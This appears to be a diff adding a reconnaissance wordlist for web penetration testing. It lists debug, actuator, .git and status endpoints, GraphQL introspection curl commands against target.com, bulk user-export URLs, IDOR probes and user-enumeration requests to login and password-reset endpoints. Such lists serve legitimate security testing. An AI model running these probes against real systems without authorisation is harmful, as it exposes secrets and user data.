@@ -1,0 +1,73 @@
+GET /
+GET /index.php?debug=1
+GET /index.php?debug=true
+GET /index.php?test=1
+GET /?debug
+GET /?phpinfo=1
+GET /phpinfo.php
+GET /info.php
+GET /test.php
+GET /status
+GET /health
+GET /health/
+GET /healthcheck
+GET /ping
+GET /version
+GET /api/version
+GET /actuator/env
+GET /actuator/configprops
+GET /actuator/beans
+GET /actuator/mappings
+GET /actuator/heapdump
+GET /actuator/httptrace
+GET /actuator/logfile
+GET /actuator/threaddump
+GET /api/debug
+GET /api/status
+GET /api/config
+GET /api/info
+GET /admin/config
+GET /admin/env
+GET /__debug__
+GET /_debug_toolbar
+GET /_profiler
+GET /.git/config
+GET /.git/HEAD
+GET /.svn/entries
+GET /server-status
+GET /server-info
+GET /nginx_status
+GET /fpm-status
+GET /metrics
+GET /prometheus
+GET /swagger.json
+GET /swagger-ui.html
+GET /api-docs
+GET /v2/api-docs
+GET /graphql?query={__schema{types{name}}}
+GET /graphiql
+curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}'
+curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){fields{name type{name}}}}"}'
+GET /trace
+GET /api/trace
+X-Debug: 1
+X-Debug-Mode: 1
+X-Developer: 1
+XDEBUG_SESSION_START: 1
+GET /wp-json/wp/v2/users
+GET /wp-json/wp/v2/posts?per_page=100
+GET /api/v1/users?page=1&per_page=1000
+GET /api/admin/logs
+GET /api/error-log
+GET /error_log
+GET /debug.log
+GET /logs/application.log
+GET /api/users?format=export
+GET /api/users?export=csv
+GET /api/data?format=json&include_all=true
+Accept: application/json (try on HTML endpoints that may return JSON with extra fields)
+curl -s https://target.com/api/resource -H "Accept: application/json" -H "X-Request-ID: debug"
+GET /api/user/1 (try IDs of other users to see how much data leaks)
+curl -s -X POST https://target.com/api/forgot-password -d '{"email":"nonexistent@x.com"}' (user enumeration)
+curl -s -X POST https://target.com/api/forgot-password -d '{"email":"admin@target.com"}' (user enumeration)
+curl -s -X POST https://target.com/api/login -d '{"username":"admin","password":"wrong"}' (different error messages = user enumeration)
